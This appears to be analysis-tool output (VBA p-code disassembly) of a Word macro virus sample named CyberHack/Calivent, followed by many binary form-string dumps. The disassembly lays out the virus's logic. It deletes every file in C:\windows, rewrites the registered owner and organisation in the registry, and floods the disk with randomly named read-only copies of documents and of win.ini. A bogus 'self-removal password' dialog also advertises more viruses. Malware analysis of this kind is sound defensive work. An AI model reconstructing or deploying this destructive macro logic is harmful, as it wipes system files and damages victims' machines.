' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "Viva el Moquegua Carajo"
' 	PrintItemNL 
' Line #229:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #230:
' 	OnError (GoTo 0) 
' Line #231:
' 	OnError (Resume Next) 
' Line #232:
' 	LitStr 0x0014 "Prog. Edwing Gabriel"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt privateprofilesstring 0x0003 
' Line #233:
' 	LitStr 0x0008 "Calivent"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt privateprofilesstring 0x0003 
' Line #234:
' 	Label Inmune 
' Line #235:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #236:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #237:
' 	LitStr 0x000F "Times New Roman"
' 	MemStWith New 
' Line #238:
' 	LitDI2 0x001E 
' 	MemStWith Size 
' Line #239:
' 	EndWith 
' Line #240:
' 	LitStr 0x000B "24 minutos "
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #241:
' 	EndIfBlock 
' Line #242:
' 	Ld wdPrintCurrentPage 
' 	ParamNamed Range 
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0001 
' Line #243:
' 	LitStr 0x000E "C:\windows\*.*"
' 	ArgsCall Kill 0x0001 
' Line #244:
' 	EndIfBlock 
' Line #245:
' 	EndSub 
' Line #246:
' 	FuncDefn (Sub Gusto())
' Line #247:
' 	OnError (Resume Next) 
' Line #248:
' 	Dim 
' 	VarDefn ArchOrigen
' 	VarDefn ArchDestino
' Line #249:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #250:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	St ArchOrigen 
' Line #251:
' 	Ld wdSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveWindow 
' 	ArgsMemCall Close 0x0001 
' 	QuoteRem 0x0032 0x000C " cerrar docu"
' Line #252:
' 	ArgsCall Read 0x0000 
' Line #253:
' 	StartForVariable 
' 	Ld archiv0 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	For 
' Line #254:
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str 0x0001 
' 	St ext 
' Line #255:
' 	Ld ext 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "1.doc"
' 	St exte 
' 	EndIf 
' Line #256:
' 	Ld ext 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "1.dot"
' 	St exte 
' 	EndIf 
' Line #257:
' 	LitStr 0x000B "c:\Calivent"
' 	LitDI2 0x07D0 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld exte 
' 	Add 
' 	St ArchDestino 
' Line #258:
' 	Ld ArchOrigen 
' 	Ld ArchDestino 
' 	ArgsCall FileCopy 0x0002 
' Line #259:
' 	Ld ArchDestino 
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #260:
' 	StartForVariable 
' 	Ld archiv0 
' 	EndForVariable 
' 	NextVar 
' Line #261:
' 	ElseBlock 
' Line #262:
' 	LitStr 0x0012 "c:\windows\win.ini"
' 	St aor 
' Line #263:
' 	ArgsCall Read 0x0000 
' Line #264:
' 	StartForVariable 
' 	Ld archiv 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	For 
' Line #265:
' 	OnError (Resume Next) 
' Line #266:
' 	LineCont 0x0014 10 00 08 00 1C 00 08 00 28 00 08 00 34 00 08 00 40 00 08 00
' 	LitStr 0x0003 "c:\"
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x00FE 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x00FD 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x00FC 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x00FB 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x00FA 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 ".sys"
' 	Add 
' 	St dest 
' Line #267:
' 	Ld aor 
' 	Ld dest 
' 	ArgsCall FileCopy 0x0002 
' 	BoS 0x0000 
' 	Ld dest 
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #268:
' 	StartForVariable 
' 	Next 
' Line #269:
' 	EndIfBlock 
' Line #270:
' 	EndSub 
' Line #271:
' Line #272:
' Macros/VBA/Calivent - 2804 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' 	FuncDefn (Private Sub Aceptar_Click())
' Line #10:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #11:
' 	End 
' Line #12:
' 	EndSub 
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub cancelar_Click())
' Line #15:
' 	ArgsCall (Call) Borrico 0x0000 
' Line #16:
' 	EndSub 
' Line #17:
' Line #18:
' 	FuncDefn (Private Sub Frame1_Click())
' Line #19:
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Private Sub Image1_Click())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	LitStr 0x001A "Calivent-hack es de Unimoq"
' 	St Título 
' Line #25:
' 	LitStr 0x00B9 "Ingrese la contraseña de autoeliminación luego su Maquina quedara limpia de virus.                                      Y si quieres Virus o información yo te la daré edcali@mixmail.com"
' 	St Mensaje 
' Line #26:
' 	LitStr 0x002E "Chino, Chino, Chino... al 2005 y kenyi al 2010"
' 	St Pred 
' Line #27:
' 	Ld Mensaje 
' 	Ld Título 
' 	Ld Pred 
' 	ArgsLd InputBox 0x0003 
' 	St valor 
' Line #28:
' 	Ld valor 
' 	LitStr 0x000E "Edwing Gabriel"
' 	Eq 
' 	IfBlock 
' Line #29:
' 	LitStr 0x0009 "eliminado"
' 	ArgsCall MsgBox 0x0001 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndSub 
' Line #32:
' Line #33:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #34:
' Line #35:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Aceptar
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TahomaR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99!ZZ9kkBkkBRJB99!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZZ9scJ��s��{ν��Ɯ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Ɯ�����k�{ZRJB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!kcB�{Z�sZ91!91!91!91!91!91!91!91!91!91!91!91!91!91!91!91!91!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
11!91!JB1ν����������RJB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k��k��c��Z��B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z��Z��R�k!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!RB)cR1kZ9sZ9scBscBkZ9ZJ1J9!1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
11!�{Zν��Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Μ�Μ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υν��{Z11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZ9kR9kR9kR9kR9kR9kR9kR9kR9kR9cR1cR1cR1cR1cR1cR1cR1cR1cR1cR1J9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!kZ9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9cR1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!J9!ZJ1kR9scBscBscBscBscBsZ9cZ9ZB1J9!91!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1�����������ބ{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{ZRJB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{Z��k��k��s�{Z��{������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s��s��s��B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1sZ9�{J��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�sJkR9B1!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1��k�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Μ�Μ�Μ�Μ�Μ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ��{RJB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1�{R�{J�{J�{J�{J�{J�{J�{J�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJcR1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZ9�kB�sJ�kB�kB�kB�sJ�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB{cB1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!kZ9scBscBscB{cBscBscBscBscBscBscBscBscBscBscBscBscBscBcZ9B1!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1�����������ބ{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{ZRJB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ɯ�֭���֭Ƶ��֭ν�ν�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s��s��s��B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!{cB��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�{RscBJB1)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZ9cZ9cZ9cZ9cZ9cZ9cZ9cZ9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9kR9�ޔ����sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZB���ν�ν��Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Υ�Υ�Υ�Υ�ΥƵ�scJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1��Z�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�sJ�sJ�sJ�sJ�sJkR9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kR9�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ{kJ1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!ZJ1scB{cB{cB{cB{cB{cB{cB{cB{cBscBscBscB{cBscB{cBscB{cBscBscBscBscBscBscBcR191!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)�������������{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�sZ�sZRJB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ƶ������������������������s�������Ɯ���������JB1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������s��B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)�{R��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�{R�sJ{cB)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z޵{������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99!���ν�ν�ν�ν�ν�ν�ν�ֽ�ֽ��Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ��{))
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�{Z�{Z�{Z�{Z�{Z�{R�{R�{R�{RkcB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kZ9�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!kZ9{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cBscBscBsZ991!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)�������������sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������֭�����������k���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sJ��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z֭s�ƄkcB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scB��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z������Υs
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZBƵ�Ƶ�Ƶ�Ƶ�ν�ν�ν�ν�ν�ν�ν�ν�ν�ֽ�ֽ�ֽ�ֽ��Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μν�ZZ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1��Z��Z��Z��Z��Z��Z��c��c��c��c��Z��c��Z��Z��Z��Z��Z��Z��Z��ZscB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scB�{R�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{R�{Z�{R�{R�{Z�{Z�{Z�{R�{R�{R�{R�sJ11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)scB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cBcR1!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)�������������kR�kR�kR�kR�kR�kR{kJ�kR{kJ�kR�kR{kJ{kJ{kJ{kJ{kJ{kJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZB�������������������������sֽ���{������������֭
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�{R��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��R��R��R��R��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�Ό����sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�Ƅ������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{ZƵ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ν�ν�ν�ν�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��Ɯ�Ɯ�Ɯ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ��c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZ9��k��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��c��c��c��c��c��c��c��cscB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
11!scB�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{R11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!cZ9{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cB{cBscBJ9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJRB)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kcB������������������������ν����������ν����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������c
-------------------------------------------------------------------------------
